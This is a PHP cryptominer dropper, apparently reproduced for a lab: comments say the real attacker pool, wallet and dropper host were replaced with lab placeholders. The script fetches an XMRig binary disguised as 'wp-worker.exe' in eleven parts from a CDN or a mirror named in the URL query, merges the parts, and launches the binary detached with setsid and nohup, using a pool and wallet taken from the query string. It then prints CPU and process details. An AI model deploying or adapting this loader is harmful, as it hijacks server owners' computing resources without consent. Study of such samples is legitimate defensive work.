<?php
declare(strict_types=1);

function isXmrigRunning(): bool {
    // Use ps instead of pgrep for better compatibility, check for the specific binary
    $cmd = "ps aux | grep -v grep | grep -q 'wp-worker'";
    exec($cmd, $output, $exitCode);
    return $exitCode === 0;
}

function startXmrig(): bool {
    global $argv;

    // Get custom parameters from URL query string
    if (isset($_SERVER['QUERY_STRING'])) {
        parse_str($_SERVER['QUERY_STRING'], $queryParams);
    } else {
        $queryParams = [];
    }
    
    $mirror = $queryParams['mirror'] ?? null;
    // ponytail: lab IOCs — never the real attacker pool/wallet.
    $pool = $queryParams['pool'] ?? 'lab-pool.internal:3333';
    $wallet = $queryParams['wallet'] ?? 'LAB_WALLET_DO_NOT_USE';
    $forcereset = $queryParams['forcereset'] ?? 'false';

    $workerPath = __DIR__ . '/wp-worker.exe';

    // Verify binary exists and handle force reset
    if (!file_exists($workerPath) || $forcereset === 'true') {
        error_log("wp-worker not found or force reset enabled at: " . $workerPath);
        
        // Download the wp-worker file
        downloadWpWorker($mirror, $workerPath);
    }

    // Make executable (though chmod from web user might fail due to permissions)
    @chmod($workerPath, 0755);

    // Get CPU threads / 2
    $threads = (int) (shell_exec('nproc') ?: 1) / 2;
    if ($threads < 1) $threads = 1;

    // Get CPU model
    $cpuModel = trim(shell_exec("lscpu | grep -i 'Model name' | cut -d':' -f2 | xargs") ?: 'Unknown');

    // Build command with nohup and setsid for true detachment
    // Using setsid to create new session, nohup to ignore hangup
    $cmd = sprintf(
        // ponytail: --randomx-mode=light keeps lab RAM ~256MB instead of ~2GB.
        'setsid nohup %s -o %s -u %s -t %d -p %s --randomx-mode=light > /dev/null 2>&1 &',
        escapeshellarg($workerPath),
        escapeshellarg($pool),
        escapeshellarg($wallet),
        $threads,
        escapeshellarg($cpuModel)
    );

    // Alternative: use shell_exec with redirection
    shell_exec($cmd);

    // Give it a moment to start
    usleep(500000); // 0.5 seconds

    return isXmrigRunning();
}

function downloadWpWorker(string $mirror = null, string $destinationPath): void {
    // ponytail: lab CDN, not the real Cloudflare Workers dropper host.
    $baseURL = 'http://lab-cdn/';
    $partCount = 11; // Adjusted for 11 parts
    $parts = [
        ['url' => 'wp-worker.part1', 'size' => 800 * 1024],
        ['url' => 'wp-worker.part2', 'size' => 800 * 1024],
        ['url' => 'wp-worker.part3', 'size' => 800 * 1024],
        ['url' => 'wp-worker.part4', 'size' => 800 * 1024],
        ['url' => 'wp-worker.part5', 'size' => 800 * 1024],
        ['url' => 'wp-worker.part6', 'size' => 800 * 1024],
        ['url' => 'wp-worker.part7', 'size' => 800 * 1024],
        ['url' => 'wp-worker.part8', 'size' => 800 * 1024],
        ['url' => 'wp-worker.part9', 'size' => 800 * 1024],
        ['url' => 'wp-worker.part10', 'size' => 800 * 1024],
        ['url' => 'wp-worker.part11', 'size' => 156 * 1024]
    ];

    if ($mirror) {
        $baseURL = "http://$mirror/";
    }

    for ($i = 0; $i < $partCount; $i++) {
        $url = $baseURL . $parts[$i]['url'];
        $filePath = $destinationPath . '.part' . ($i + 1);

        // Download each part with retry logic
        $maxRetries = 5;
        $retryDelay = 2000; // 2 seconds
        for ($j = 0; $j < $maxRetries; $j++) {
            file_put_contents($filePath, fopen($url, 'r'));
            // ponytail: lab accepts any non-empty part (real xmrig != 800KB chunks).
            if (file_exists($filePath) && filesize($filePath) > 0) {
                break;
            }
            error_log("Download failed for part " . ($i + 1) . ", retrying...");
            unlink($filePath); // Remove incomplete part
            sleep($retryDelay / 1000);
        }

        if (!file_exists($filePath) || filesize($filePath) === 0) {
            error_log("Failed to download part " . ($i + 1));
            return;
        }
    }

    // Merge the parts into a single file
    $tempFile = tempnam(sys_get_temp_dir(), 'wp-worker');
    for ($i = 0; $i < $partCount; $i++) {
        file_put_contents($tempFile, file_get_contents($destinationPath . '.part' . ($i + 1)), FILE_APPEND);
        unlink($destinationPath . '.part' . ($i + 1)); // Remove individual part files
    }

    rename($tempFile, $destinationPath); // Rename temp file to final destination

    error_log("wp-worker downloaded and merged successfully at: " . $destinationPath);
}

if (isXmrigRunning()) {
    echo "OK\n";
       // Get CPU model using lscpu
    $cpuModel = shell_exec("lscpu");
    if ($cpuModel !== false) {
        echo "CPU Model:\n" . trim($cpuModel) . "\n";
    } else {
        error_log("Failed to get CPU model.");
    }

    // Check if xmrig is running using ps
    $xmrigProcess = shell_exec("ps aux | grep -v grep | grep 'wp-worker'");
    if ($xmrigProcess !== false) {
        echo "XMRIG Process Details:\n" . trim($xmrigProcess);
    } else {
        error_log("Failed to get XMRIG process details.");
    }
    exit(0);
}

if (startXmrig()) {
    echo "wp-worker was not running; started successfully\n";
    
    // Get CPU model using lscpu
    $cpuModel = shell_exec("lscpu");
    if ($cpuModel !== false) {
        echo "CPU Model:\n" . trim($cpuModel) . "\n";
    } else {
        error_log("Failed to get CPU model.");
    }

    // Check if xmrig is running using ps
    $xmrigProcess = shell_exec("ps aux | grep -v grep | grep 'wp-worker'");
    if ($xmrigProcess !== false) {
        echo "XMRIG Process Details:\n" . trim($xmrigProcess);
    } else {
        error_log("Failed to get XMRIG process details.");
    }
} else {
    echo "Failed to start wp-worker\n";
     // Get CPU model using lscpu
    $cpuModel = shell_exec("lscpu");
    if ($cpuModel !== false) {
        echo "CPU Model:\n" . trim($cpuModel) . "\n";
    } else {
        error_log("Failed to get CPU model.");
    }

    // Check if xmrig is running using ps
    $xmrigProcess = shell_exec("ps aux | grep -v grep | grep 'wp-worker'");
    if ($xmrigProcess !== false) {
        echo "XMRIG Process Details:\n" . trim($xmrigProcess);
    } else {
        error_log("Failed to get XMRIG process details.");
    }
}
?>
